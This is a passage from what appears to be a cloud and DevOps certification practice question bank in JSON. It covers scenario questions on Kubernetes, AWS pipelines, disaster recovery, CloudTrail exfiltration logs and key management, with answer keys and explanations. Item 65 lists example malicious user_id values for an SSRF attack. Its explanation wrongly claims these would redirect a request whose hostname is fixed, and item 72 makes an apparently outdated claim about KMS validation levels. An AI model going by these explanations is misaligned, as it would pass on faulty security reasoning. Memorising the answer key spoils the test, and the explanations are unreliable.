+      "explanation": "JVM full garbage collection pauses stopping application threads is the most likely cause of the application becoming unresponsive. The logs show clear evidence of this pattern. Normal requests complete in around 300-330ms, but there's a significant gap in request processing during garbage collection events. The most telling evidence is the Full GC event at 14:40:16.789Z that took 4.37 seconds of real time, during which no requests were processed. After this pause, request processing resumed at 14:40:21.123Z. This directly explains the user-reported symptom of the application becoming unresponsive for short periods and then recovering. The JVM arguments show a heap size of 2GB (-Xms2g -Xmx2g) with the Parallel GC collector (-XX:+UseParallelGC), which prioritizes throughput over latency and can cause longer stop-the-world pauses during Full GC events. The GCTimeRatio=99 attempts to limit GC time but doesn't prevent full GC pauses. There's no evidence of network latency in the logs, as request processing times are consistent when the application is responsive. Container CPU throttling would typically manifest as generally slower processing times rather than complete pauses. Database connection pool issues would show errors or timeouts when attempting to acquire connections, which aren't present in the logs.",
+      "examTip": "When troubleshooting Java application performance in containers, examine garbage collection logs carefully—full GC pauses that stop all application threads are a common cause of application unresponsiveness, especially with throughput-focused collectors that prioritize overall performance over consistent latency."
+    },
+    {
+      "id": 65,
+      "question": "A cloud engineer is working on a data pipeline that processes user uploads in AWS. The current architecture uses Lambda functions triggered by S3 uploads, with results stored in DynamoDB. During a code review, a security engineer identifies several issues with the Lambda function code shown below:\n\n```python\nimport boto3\nimport json\nimport os\nimport urllib.request\n\ndef lambda_handler(event, context):\n    # Get the uploaded file details\n    bucket = event['Records'][0]['s3']['bucket']['name']\n    key = event['Records'][0]['s3']['object']['key']\n    \n    # Connect to services\n    s3 = boto3.client('s3')\n    dynamodb = boto3.resource('dynamodb')\n    table = dynamodb.Table(os.environ['TABLE_NAME'])\n    \n    # Download and process the file\n    download_path = f\"/tmp/{key.split('/')[-1]}\"\n    s3.download_file(bucket, key, download_path)\n    \n    # Extract user ID from the key\n    user_id = key.split('/')[0]\n    \n    # Process and validate upload\n    validation_result = validate_upload(download_path)\n    \n    # For certain files, get additional metadata from user's profile service\n    if key.endswith('.csv'):\n        profile_url = f\"https://api.example.com/users/{user_id}/profile\"\n        api_key = os.environ['API_KEY']\n        req = urllib.request.Request(\n            profile_url,\n            headers={'Authorization': f'Bearer {api_key}'}\n        )\n        with urllib.request.urlopen(req) as response:\n            profile_data = json.loads(response.read().decode())\n            validation_result['userTier'] = profile_data['tier']\n    \n    # Save results to DynamoDB\n    table.put_item(\n        Item={\n            'fileId': key,\n            'userId': user_id,\n            'status': validation_result['status'],\n            'metadata': json.dumps(validation_result),\n            'timestamp': int(context.invoked_at_timestamp)\n        }\n    )\n    \n    return {\n        'statusCode': 200,\n        'body': json.dumps(f\"Processed file {key} successfully\")\n    }\n\ndef validate_upload(file_path):\n    # Validation logic here\n    return {'status': 'valid', 'fileSize': os.path.getsize(file_path)}\n```\n\nWhich security vulnerability represents the highest risk in this code?",
+      "options": [
+        "Insecure direct object reference by allowing user IDs in the S3 key path",
+        "Potential path traversal attack through unvalidated file paths in S3 keys",
+        "Server-side request forgery through unchecked URL construction with user input",
+        "Exposure of sensitive API credentials in Lambda environment variables"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "The highest risk security vulnerability is server-side request forgery (SSRF) through unchecked URL construction with user input. The code constructs a URL using the user_id extracted from the S3 key without any validation: `profile_url = f\"https://api.example.com/users/{user_id}/profile\"`. Since the user_id comes directly from the S3 key, which can be controlled by the user during upload, an attacker could craft a special key containing a malicious user_id value like `../../../internal-service` or `example.com.attacker.com`. When the Lambda function processes this file, it would make an HTTP request to an attacker-controlled endpoint or to internal services not normally accessible, potentially exposing sensitive information or allowing lateral movement within the infrastructure. The code also uses `urllib.request.urlopen()` which follows redirects by default, increasing the risk. This is particularly dangerous because the request includes an API key in the Authorization header, which could be leaked to external servers. Insecure direct object reference through user IDs in the path is present but represents lower risk without additional vulnerabilities to exploit it. Path traversal in the download path is partially mitigated by the use of `split('/')[-1]` which takes only the filename portion. API credentials in environment variables is standard practice for Lambda functions and not inherently vulnerable unless combined with other issues like the SSRF vulnerability.",
+      "examTip": "When reviewing code that makes HTTP requests, pay special attention to URL construction using user-controllable input—server-side request forgery vulnerabilities can lead to unauthorized access to internal services, credential leakage, and data exfiltration when HTTP clients operate within trusted network environments."
+    },
+    {
+      "id": 66,
+      "question": "A cloud architect is designing a system for processing real-time data streams from IoT devices. The architecture must handle millions of events per hour with low latency processing and high durability guarantees. The solution involves multiple components working together as shown in the following AWS architecture diagram:\n\n```\nIoT Devices → IoT Core → Kinesis Data Streams → Lambda Function → DynamoDB\n                                ↓\n                         S3 (raw data storage)\n```\n\nDuring the initial load testing phase, some events are being delayed or lost. The team collects the following metrics:\n\n- IoT Core message ingestion success rate: 99.9%\n- Kinesis Data Streams incoming records: ~1M/hour\n- Kinesis Data Streams GetRecords.IteratorAgeMilliseconds: peaking at 5000ms\n- Lambda concurrent executions: 150 (out of 1000 limit)\n- Lambda throttling: 0 events\n- Lambda execution time: avg 800ms, max 1200ms\n- DynamoDB write capacity consumed: 70% of provisioned\n\nWhat configuration change would most effectively address the data processing delays?",
+      "options": [
+        "Increase the Lambda function memory allocation to reduce processing time",
+        "Change the Kinesis Data Stream from on-demand to provisioned with higher shard count",
+        "Modify the Lambda batch size and parallelization factor for Kinesis trigger",
+        "Implement a retry mechanism with exponential backoff in the Lambda function"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Modifying the Lambda batch size and parallelization factor for the Kinesis trigger would most effectively address the data processing delays. The key metric indicating an issue is the GetRecords.IteratorAgeMilliseconds peaking at 5000ms (5 seconds), which measures the difference between the current time and when the last record was read. This suggests that records are waiting in the stream longer than optimal before being processed, creating a backlog. The Lambda concurrent executions (150) are well below the account limit (1000), indicating there's room to scale up processing. By increasing the batch size, each Lambda invocation processes more records at once, improving efficiency. Increasing the parallelization factor allows multiple Lambda instances to process records from the same shard concurrently, effectively increasing throughput without changing the stream configuration. The Lambda execution time (avg 800ms) and lack of throttling suggest the functions themselves have adequate resources and aren't being limited by concurrency controls. Increasing Lambda memory might marginally improve processing time but wouldn't address the fundamental issue of processing parallelism. Changing Kinesis from on-demand to provisioned would be an unnecessary change as there's no indication the stream itself is limiting throughput. A retry mechanism wouldn't help as there's no evidence of processing failures that would require retries.",
+      "examTip": "When troubleshooting stream processing architectures, pay special attention to iterator age metrics—high values indicate records waiting too long for processing, which often requires adjusting consumer parallelism rather than raw resources or stream capacity."
+    },
+    {
+      "id": 67,
+      "question": "A cloud engineer is implementing disaster recovery for a critical application deployed on AWS. The application consists of EC2 instances, an RDS database, and an Elastic Load Balancer. The business has defined the following recovery objectives:\n\n- Recovery Time Objective (RTO): 1 hour\n- Recovery Point Objective (RPO): 15 minutes\n\nThe engineer proposes a pilot light DR strategy with the following components:\n\n1. Cross-region replication of RDS using read replicas\n2. Regular AMI backups of EC2 instances\n3. Infrastructure as Code using CloudFormation for rapid deployment\n4. DNS failover using Route 53 health checks\n\nDuring a DR drill, the team identifies that the actual recovery time exceeds the 1-hour RTO. The breakdown of recovery steps and their duration is as follows:\n\n```\n1. Detect failure and make failover decision: 10 minutes\n2. Promote RDS read replica to primary: 5 minutes\n3. Deploy EC2 instances from AMIs: 30 minutes\n4. Configure and verify application on new instances: 45 minutes\n5. Update DNS and wait for propagation: 20 minutes\n\nTotal recovery time: 110 minutes\n```\n\nWhich modification to the DR strategy would most effectively bring the recovery time within the RTO while maintaining or improving the RPO?",
+      "options": [
+        "Switch from RDS read replicas to Multi-AZ deployments within the primary region",
+        "Implement automated failover using AWS Lambda and EventBridge",
+        "Move from a pilot light to a warm standby approach with minimal EC2 instances running",
+        "Replace Route 53 DNS failover with Elastic Load Balancer in front of Global Accelerator"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Moving from a pilot light to a warm standby approach with minimal EC2 instances running would most effectively bring the recovery time within the RTO while maintaining or improving the RPO. The current breakdown shows that deploying and configuring EC2 instances takes the largest portion of the recovery time (75 minutes combined). A warm standby approach would keep minimal EC2 instances already running in the DR region with the application installed and configured, ready to scale up during a disaster. This eliminates the 30-minute deployment time and significantly reduces the 45-minute configuration time, potentially bringing the total recovery time under the 1-hour RTO. The warm standby approach maintains the cross-region RDS read replica, preserving or improving the existing RPO of 15 minutes. Switching from RDS read replicas to Multi-AZ deployments would not improve recovery time for region-wide disasters, as Multi-AZ operates within a single region and doesn't help with cross-region failover. Automated failover using Lambda and EventBridge could reduce the detection and decision time (currently 10 minutes) but wouldn't significantly address the EC2 deployment and configuration delays that represent the bulk of the recovery time. Replacing Route 53 with ELB and Global Accelerator might marginally improve DNS propagation time but wouldn't address the dominant recovery time components related to EC2 resources.",
+      "examTip": "When optimizing disaster recovery strategies to meet specific RTO requirements, focus on the recovery steps that consume the most time—typically computing resource deployment and configuration—and consider higher availability approaches like warm standby when pilot light strategies can't meet tight RTO windows."
+    },
+    {
+      "id": 68,
+      "question": "A DevOps engineer is investigating an issue with a Kubernetes cluster where some pods are being terminated unexpectedly. The cluster runs critical microservices with the following configuration for one of the affected deployments:\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: payment-service\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: payment-service\n  template:\n    metadata:\n      labels:\n        app: payment-service\n    spec:\n      containers:\n      - name: payment-service\n        image: payment-service:1.9.2\n        resources:\n          requests:\n            memory: \"256Mi\"\n            cpu: \"100m\"\n          limits:\n            memory: \"512Mi\"\n            cpu: \"200m\"\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 15\n          periodSeconds: 10\n```\n\nThe engineer examines the following pod events:\n\n```\nEvents:\n  Type     Reason     Age                From               Message\n  ----     ------     ----               ----               -------\n  Normal   Scheduled  5m                 default-scheduler  Successfully assigned default/payment-service-59d5d7c7b9-xj7tb to node-3\n  Normal   Pulled     5m                 kubelet            Container image \"payment-service:1.9.2\" already present on machine\n  Normal   Created    5m                 kubelet            Created container payment-service\n  Normal   Started    5m                 kubelet            Started container payment-service\n  Normal   Killing    30s (x2 over 2m)   kubelet            Container payment-service failed liveness probe, will be restarted\n```\n\nThe engineer also collects the following metrics from a pod before termination:\n\n```\nContainer CPU usage: spikes to 190m (95% of limit) during transaction processing\nContainer memory usage: gradually increases from 300Mi to 490Mi over 2 minutes of operation\nAPI latency: increases from 50ms to 700ms as memory usage grows\nGarbage collection: frequent GC events observed in container logs\n```\n\nWhat is the most likely cause of the pod terminations?",
+      "options": [
+        "The health endpoint is returning errors during high CPU utilization periods",
+        "Memory pressure approaching the limit causes poor application performance and probe timeouts",
+        "The readiness probe and liveness probe contending for resources at the same check interval",
+        "Container restart policy forcing termination after multiple garbage collection pauses"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Memory pressure approaching the limit causing poor application performance and probe timeouts is the most likely cause of the pod terminations. The metrics show memory usage gradually climbing to 490Mi, which is very close to the configured memory limit of 512Mi (about 95% usage). As the memory usage increases, the API latency also increases dramatically from 50ms to 700ms, indicating that the application is struggling under memory pressure, likely due to frequent garbage collection as confirmed by the logs. This increased latency would cause the liveness probe (which checks /health on port 8080) to time out, as Kubernetes has default timeout settings for probes. The pod events confirm this with the message \"Container payment-service failed liveness probe, will be restarted\". The health endpoint itself isn't necessarily returning errors (which would show as a different failure message), but rather the application is becoming too slow to respond to the probe requests within the timeout period. CPU usage, while high during processing (95% of limit), isn't consistently at the limit and wouldn't typically cause the progressive latency increase observed. There's no indication of probe contention in the configuration, as the readiness and liveness probes have different initial delays and check intervals. Container restart policies don't automatically force termination due to garbage collection pauses; they respond to process exits or probe failures.",
+      "examTip": "When troubleshooting Kubernetes pod terminations with liveness probe failures, correlate application performance metrics with resource usage—gradual increases in resource usage (especially memory) accompanied by increasing latency often indicate resource pressure causing probe timeouts rather than actual application errors."
+    },
+    {
+      "id": 69,
+      "question": "A DevOps engineer is configuring a continuous deployment pipeline using GitHub Actions for a microservices application hosted on AWS ECS. The pipeline must securely handle AWS credentials and ensure that each service can only update its own resources. The engineer creates the following GitHub Actions workflow file:\n\n```yaml\nname: Deploy to Production\n\non:\n  push:\n    branches: [ main ]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      \n      - name: Configure AWS credentials\n        uses: aws-actions/configure-aws-credentials@v1\n        with:\n          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          aws-region: us-west-2\n      \n      - name: Login to Amazon ECR\n        id: login-ecr\n        uses: aws-actions/amazon-ecr-login@v1\n      \n      - name: Build, tag, and push image to Amazon ECR\n        env:\n          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}\n          ECR_REPOSITORY: my-service\n          IMAGE_TAG: ${{ github.sha }}\n        run: |\n          docker build -t $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG .\n          docker push $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG\n      \n      - name: Update ECS service\n        run: |\n          aws ecs update-service --cluster production-cluster \\\n            --service my-service \\\n            --force-new-deployment\n```\n\nWhat security vulnerability exists in this workflow configuration?",
+      "options": [
+        "Using long-term AWS access keys stored as GitHub secrets",
+        "Insufficient permission scoping for accessing ECR and ECS resources",
+        "Lack of image scanning before pushing to ECR repository",
+        "Missing input validation for dynamic workflow parameters"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The security vulnerability in this workflow is using long-term AWS access keys stored as GitHub secrets. The workflow uses `aws-access-key-id` and `aws-secret-access-key` as GitHub secrets, which indicates the pipeline is using long-lived IAM user credentials. This approach creates several security risks: 1) These credentials never expire unless manually rotated, 2) If compromised, they provide persistent access to AWS resources, 3) They typically have broader permissions than necessary, and 4) They bypass AWS's recommended short-term credential approach. The recommended secure approach is to use OpenID Connect (OIDC) to establish trust between GitHub Actions and AWS, allowing GitHub Actions to obtain temporary security credentials just-in-time for each workflow run without storing any AWS credentials as long-term secrets. Insufficient permission scoping is a concern but not explicitly demonstrated in the provided code, as we don't see the actual permissions of the access key being used. Missing image scanning is a good security practice but not a vulnerability in the authentication/authorization mechanism itself. There aren't any dynamic workflow parameters visible in this workflow that would require input validation, making this option not applicable to the provided code.",
+      "examTip": "When reviewing CI/CD pipeline security, prioritize issues with credential management—using long-term access keys stored in CI/CD systems (even as protected secrets) creates unnecessary security risk compared to OIDC or other temporary credential approaches that issue short-lived tokens on-demand."
+    },
+    {
+      "id": 70,
+      "question": "A cloud security engineer is reviewing AWS CloudTrail logs after receiving an alert about suspicious activity. The alert indicates potential data exfiltration from an S3 bucket containing sensitive customer information. The engineer finds the following CloudTrail events (some fields omitted for brevity):\n\n```json\n{\n  \"eventTime\": \"2023-05-28T02:14:52Z\",\n  \"eventSource\": \"iam.amazonaws.com\",\n  \"eventName\": \"CreateAccessKey\",\n  \"awsRegion\": \"us-east-1\",\n  \"sourceIPAddress\": \"203.0.113.100\",\n  \"userAgent\": \"console.amazonaws.com\",\n  \"requestParameters\": {\n    \"userName\": \"database-admin\"\n  },\n  \"responseElements\": {\n    \"accessKey\": {\n      \"accessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n      \"status\": \"Active\",\n      \"userName\": \"database-admin\",\n      \"createDate\": \"May 28, 2023 2:14:52 AM\"\n    }\n  }\n}\n\n{\n  \"eventTime\": \"2023-05-28T02:17:03Z\",\n  \"eventSource\": \"iam.amazonaws.com\",\n  \"eventName\": \"AttachUserPolicy\",\n  \"awsRegion\": \"us-east-1\",\n  \"sourceIPAddress\": \"203.0.113.100\",\n  \"userAgent\": \"console.amazonaws.com\",\n  \"requestParameters\": {\n    \"userName\": \"database-admin\",\n    \"policyArn\": \"arn:aws:iam::aws:policy/AmazonS3FullAccess\"\n  }\n}\n\n{\n  \"eventTime\": \"2023-05-28T02:24:17Z\",\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"ListBuckets\",\n  \"awsRegion\": \"us-east-1\",\n  \"sourceIPAddress\": \"198.51.100.24\",\n  \"userAgent\": \"aws-cli/2.9.8 Python/3.9.11\",\n  \"requestParameters\": null,\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"userName\": \"database-admin\",\n    \"accessKeyId\": \"AKIAIOSFODNN7EXAMPLE\"\n  }\n}\n\n{\n  \"eventTime\": \"2023-05-28T02:25:36Z\",\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"GetObject\",\n  \"awsRegion\": \"us-east-1\",\n  \"sourceIPAddress\": \"198.51.100.24\",\n  \"userAgent\": \"aws-cli/2.9.8 Python/3.9.11\",\n  \"requestParameters\": {\n    \"bucketName\": \"customer-financial-records\",\n    \"key\": \"exported-records-2023.csv\"\n  },\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"userName\": \"database-admin\",\n    \"accessKeyId\": \"AKIAIOSFODNN7EXAMPLE\"\n  }\n}\n\n{\n  \"eventTime\": \"2023-05-28T02:35:42Z\",\n  \"eventSource\": \"iam.amazonaws.com\",\n  \"eventName\": \"DeleteAccessKey\",\n  \"awsRegion\": \"us-east-1\",\n  \"sourceIPAddress\": \"203.0.113.100\",\n  \"userAgent\": \"console.amazonaws.com\",\n  \"requestParameters\": {\n    \"userName\": \"database-admin\",\n    \"accessKeyId\": \"AKIAIOSFODNN7EXAMPLE\"\n  }\n}\n```\n\nBased on these log entries, which conclusion is most accurate about the potential security incident?",
+      "options": [
+        "Normal administrative activity as the same IP address created and deleted the access key",
+        "Accidental security policy misconfiguration granting excess S3 permissions",
+        "Credential theft via phishing as multiple user agents and IPs accessed the same data",
+        "Insider threat with privileged user extracting sensitive customer records"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "The logs indicate an insider threat with a privileged user extracting sensitive customer records. The timeline and actions show a deliberate pattern: First, at 02:14:52, a new access key was created for the database-admin user from IP 203.0.113.100 via the AWS console. Then, at 02:17:03, the same user from the same IP attached the AmazonS3FullAccess policy to their account, significantly expanding their permissions. Next, at 02:24:17 and 02:25:36, the newly created access key was used from a different IP address (198.51.100.24) with the AWS CLI to list buckets and download a file named \"exported-records-2023.csv\" from a bucket called \"customer-financial-records\". Finally, at 02:35:42, the original IP address returned to delete the access key, an attempt to cover their tracks. This pattern strongly suggests a deliberate action by someone with legitimate admin console access who created temporary credentials, used them from another location to extract data, and then removed the evidence by deleting the access key. The theory of normal administrative activity doesn't explain why the access key was used from a different IP with a different user agent. An accidental misconfiguration wouldn't involve this systematic pattern of creating and deleting access keys. Credential theft via phishing typically wouldn't show the attacker returning to the AWS console from the original IP to delete the access key.",
+      "examTip": "When analyzing security incidents in cloud logs, look for patterns involving privilege escalation, credential creation, data access, and cleanup activities—these often indicate deliberate data exfiltration rather than accidental misconfigurations or simple account compromises."
+    },
+    {
+      "id": 71,
+      "question": "A company is deploying a new application on Google Kubernetes Engine (GKE). Security is a top priority, and they need to ensure that pods have only the minimum required permissions to access Google Cloud resources. The security team provides the following Kubernetes deployment manifest for review:\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend-service\n  namespace: production\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: backend-service\n  template:\n    metadata:\n      labels:\n        app: backend-service\n    spec:\n      serviceAccountName: backend-service-sa\n      containers:\n      - name: backend-service\n        image: gcr.io/my-project/backend-service:1.0.0\n        ports:\n        - containerPort: 8080\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /var/secrets/google/key.json\n        volumeMounts:\n        - name: google-cloud-key\n          mountPath: /var/secrets/google\n      volumes:\n      - name: google-cloud-key\n        secret:\n          secretName: backend-service-key\n```\n\nThe application needs to read objects from a specific Cloud Storage bucket and send messages to a Pub/Sub topic. What configuration issue in this manifest could lead to excessive permissions?",
+      "options": [
+        "Using a hardcoded service account name without proper role binding",
+        "Including GOOGLE_APPLICATION_CREDENTIALS environment variable with service account key",
+        "Missing securityContext restrictions for the container privilege level",
+        "Storing the service account key as a Kubernetes Secret without encryption"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "The key issue is including the GOOGLE_APPLICATION_CREDENTIALS environment variable with a service account key stored as a Kubernetes Secret. This approach uses a downloaded service account key JSON file mounted into the pod, which bypasses Kubernetes' native integration with Google Cloud IAM through Workload Identity. When using service account keys this way, the permissions are tied to the key itself rather than the Kubernetes service account, and these keys are long-lived credentials that don't automatically rotate. This creates several security issues: 1) The key has all permissions of the service account rather than being scoped to just the required GCS and Pub/Sub access, 2) Key rotation is manual rather than automatic, 3) Anyone with access to the pod or the Kubernetes Secret can potentially extract the key and use it outside the cluster. The proper approach would be to use GKE Workload Identity, which allows binding a Kubernetes service account to a Google Cloud service account without requiring key files. This enables automatic credential rotation and proper auditing. The hardcoded service account name itself isn't a security issue if proper role bindings are created. Missing securityContext is a concern but doesn't directly relate to cloud resource permissions. Storing service account keys in Kubernetes Secrets without encryption is also concerning but is secondary to the fundamental architectural issue of using key files instead of Workload Identity.",
+      "examTip": "When reviewing cloud-native application security, look for the use of long-lived credential files rather than modern workload identity mechanisms—key files mounted into containers bypass the managed authentication flow and represent a higher security risk compared to federated identity between container orchestrators and cloud IAM systems."
+    },
+    {
+      "id": 72,
+      "question": "A cloud architect is designing a solution for a financial application that processes sensitive customer data. The application needs to securely store encryption keys for data at rest. The architect is considering the following options in AWS:\n\n1. AWS Key Management Service (KMS) with Customer Managed Keys (CMK)\n2. AWS CloudHSM with dedicated hardware security modules\n3. AWS Secrets Manager with automatic rotation\n4. Client-side encryption with keys stored in an EC2 instance\n\nThe application has the following requirements:\n- Keys must be stored in FIPS 140-2 Level 3 validated hardware\n- The organization must have direct control over key management operations\n- There must be clear separation of duties between cloud administrators and key administrators\n- Key usage must be logged for audit purposes\n\nWhich solution best meets all these requirements?",
+      "options": [
+        "AWS KMS with CMK using a custom key store backed by CloudHSM",
+        "AWS KMS with CMK and key administrators defined through IAM roles",
+        "AWS CloudHSM with dedicated HSM instances and application-managed keys",
+        "AWS Secrets Manager with keys automatically rotated and stored in KMS"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "AWS CloudHSM with dedicated HSM instances and application-managed keys best meets all the requirements. CloudHSM provides dedicated Hardware Security Modules (HSMs) that are FIPS 140-2 Level 3 validated, satisfying the hardware validation requirement. With CloudHSM, the organization has direct control over key management operations as they exclusively manage the HSM cluster and the keys within it, with AWS having no access to the keys or the ability to recover them. CloudHSM also allows for complete separation of duties through its crypto users and application users with distinct credentials and permissions, keeping key administration separate from cloud administration. All key usage operations on CloudHSM are logged and can be exported for audit purposes. AWS KMS with a custom key store backed by CloudHSM would provide the FIPS validation but introduces AWS KMS as an intermediary service, reducing the directness of control. Standard AWS KMS with CMK doesn't meet the FIPS 140-2 Level 3 requirement as standard KMS is validated at Level 2. Secrets Manager is designed for storing secrets like passwords and API keys, not for managing encryption keys used for data at rest, and also doesn't satisfy the hardware requirements.",
+      "examTip": "When selecting key management solutions for financial applications with regulatory compliance requirements, carefully evaluate the specific validation levels and control requirements—CloudHSM typically provides higher compliance levels (FIPS 140-2 Level 3 vs Level 2 for KMS) and more direct customer control over the key hierarchy than managed key services."
+    },
+    {
+      "id": 73,
+      "question": "A cloud engineer is investigating performance issues in a web application deployed on Kubernetes. The application is experiencing increased latency and occasional timeouts during peak traffic periods. The engineer examines the following metric data collected from the Kubernetes cluster:\n\n**Pod Metrics (during peak traffic):**\n```\nCPU usage: 65% (limit: 1 CPU core)\nMemory usage: 1.2 GB (limit: 2 GB)\nNetwork Rx: 180 Mbps\nNetwork Tx: 220 Mbps\n```\n\n**Node Metrics (averaged across cluster):**\n```\nCPU usage: 72% (limit: 8 CPU cores per node)\nMemory usage: 80% (limit: 32 GB per node)\nDisk IOPS: 1200 (limit: 3000)\nNetwork bandwidth: 7.2 Gbps (limit: 10 Gbps)\n```\n\n**Application Metrics:**\n```\nAverage response time: 2.8 seconds (up from 0.5 seconds during normal traffic)\nError rate: 2.5% (up from 0.1% during normal traffic)\nDatabase query time: 0.8 seconds (up from 0.2 seconds during normal traffic)\nConnection pool usage: 95% (up from 60% during normal traffic)\n```\n\n**Kubernetes Events:**\n```\nNo pod evictions or OOM events\nNo node failures\nNo autoscaling events triggered\n```\n\nBased on these metrics, what is the most likely cause of the performance issues?",
+      "options": [
+        "Insufficient CPU resources causing processing delays in application pods",
+        "Memory pressure on nodes leading to increased swapping and latency",
+        "Database connection pool saturation causing queuing of requests",
+        "Network congestion between application components and external services"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Database connection pool saturation causing queuing of requests is the most likely cause of the performance issues. The application metrics show that connection pool usage has increased dramatically from 60% to 95% during peak traffic, and this correlates with a 4x increase in database query time (from 0.2 seconds to 0.8 seconds). When a connection pool approaches saturation, new requests must wait for connections to become available, creating a queue that directly increases response time. This pattern explains the observed 5.6x increase in average response time (from 0.5 seconds to 2.8 seconds) and the rise in error rate as some requests timeout while waiting for database connections. The resource metrics for CPU, memory, disk, and network all show sufficient headroom, with none approaching their limits. Pod CPU usage is at 65% of limit, memory is at 60%, and node resources also have acceptable utilization levels. There are no Kubernetes events indicating resource constraints or scaling issues. This points to a bottleneck at the application level rather than an infrastructure capacity issue. Database connection pools are a common bottleneck in web applications during traffic spikes, as they are often configured with fixed sizes that don't scale automatically with load.",
+      "examTip": "When troubleshooting application performance issues, look beyond infrastructure metrics to application-specific bottlenecks—high resource utilization percentages on connection pools, thread pools, or queue depths often indicate architectural limitations rather than raw infrastructure capacity problems."
+    },
+    {
+      "id": 74,
+      "question": "A DevOps engineer is configuring a CI/CD pipeline for a microservices application. They need to implement security scanning as part of the pipeline to identify vulnerabilities before deployment. The following GitLab CI/CD pipeline configuration is proposed:\n\n```yaml\nstages:\n  - build\n  - test\n  - scan\n  - deploy\n\nvariables:\n  DOCKER_REGISTRY: registry.example.com\n  IMAGE_TAG: $CI_COMMIT_SHORT_SHA\n\nbuild:\n  stage: build\n  script:\n    - docker build -t $DOCKER_REGISTRY/app:$IMAGE_TAG .\n    - docker push $DOCKER_REGISTRY/app:$IMAGE_TAG\n\nunit_test:\n  stage: test\n  script:\n    - npm ci\n    - npm run test\n\nintegration_test:\n  stage: test\n  script:\n    - npm run integration-test\n\nsecurity_scan:\n  stage: scan\n  script:\n    - trivy image $DOCKER_REGISTRY/app:$IMAGE_TAG --severity HIGH,CRITICAL --exit-code 0\n    - echo \"Security scan completed\"\n\ndeploy_production:\n  stage: deploy\n  script:\n    - kubectl set image deployment/app app=$DOCKER_REGISTRY/app:$IMAGE_TAG\n  environment:\n    name: production\n  when: manual\n```\n\nWhat security issue exists in this pipeline configuration?",
+      "options": [
+        "The security scan runs after the image is already pushed to the registry",
+        "The security scan ignores medium and low severity vulnerabilities",
+        "The security scan is configured to always pass with exit-code 0",
+        "No authentication is specified for accessing the Docker registry"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "The security scan is configured to always pass with exit-code 0, which is the security issue in this pipeline. The Trivy scanning command includes the parameter `--exit-code 0`, which forces the scanner to always exit with a successful status code (0) regardless of whether vulnerabilities are found. This effectively makes the security scan a purely informational step that can never fail the pipeline, allowing deployments to proceed even when critical vulnerabilities are detected. This undermines the purpose of including security scanning in the CI/CD pipeline, which should be to prevent vulnerable code from being deployed. The security scan running after the image is pushed to the registry isn't ideal but isn't inherently a security issue as the image isn't deployed to production automatically (the deploy stage is manual). Ignoring medium and low severity vulnerabilities is a risk assessment decision rather than a clear security issue - many organizations prioritize high and critical vulnerabilities first. The lack of specified authentication for the Docker registry might be a concern, but credentials could be provided through CI/CD variables or other secure mechanisms not visible in this snippet.",
+      "examTip": "When reviewing security controls in CI/CD pipelines, pay close attention to exit codes and failure conditions—scanners configured to always succeed (`--exit-code 0`) regardless of findings effectively bypass the security gate, allowing vulnerable code to proceed through the pipeline."
+    },
+    {
+      "id": 75,
+      "question": "A cloud architect is designing a solution for a global e-commerce platform. The application needs to serve customers worldwide with low latency while maintaining data consistency. The architect proposes the following architecture using AWS services:\n\n```\n                           ┌────────────────┐\n                           │                │\n                           │  Route 53      │\n                           │  Geolocation   │\n                           │                │\n                           └───────┬────────┘\n                                   │\n                  ┌────────────────┴────────────────┐\n                  │                                 │\n         ┌────────▼───────┐               ┌────────▼───────┐\n         │                │               │                │\n         │  CloudFront    │               │  CloudFront    │\n         │  (US)          │               │  (EU)          │\n         │                │               │                │\n         └────────┬───────┘               └────────┬───────┘\n                  │                                 │\n         ┌────────▼───────┐               ┌────────▼───────┐\n         │                │               │                │\n         │  ALB           │               │  ALB           │\n         │  (us-east-1)   │               │  (eu-west-1)   │\n         │                │               │                │\n         └────────┬───────┘               └────────┬───────┘\n                  │                                 │\n         ┌────────▼───────┐               ┌────────▼───────┐\n         │                │               │                │\n         │  EC2 Auto      │               │  EC2 Auto      │\n         │  Scaling Group │               │  Scaling Group │\n         │                │               │                │\n         └────────┬───────┘               └────────┬───────┘\n                  │                                 │\n                  └─────────────┬─────────────────┬┘\n                                │                 │\n                      ┌─────────▼──────┐  ┌──────▼────────┐\n                      │                │  │               │\n                      │  DynamoDB     │  │  RDS Aurora   │\n                      │  Global       │  │  Global       │\n                      │                │  │               │\n                      └────────────────┘  └───────────────┘\n```\n\nThe architecture uses the following components:\n1. Route 53 with geolocation routing to direct users to the nearest region\n2. CloudFront distributions in US and EU regions\n3. Application Load Balancers in us-east-1 and eu-west-1\n4. EC2 Auto Scaling Groups in each region\n5. DynamoDB Global Tables for product catalog and shopping cart\n6. Aurora Global Database for order history and customer data\n\nWhich aspect of this architecture is most likely to cause consistency issues for the e-commerce platform?",
+      "options": [
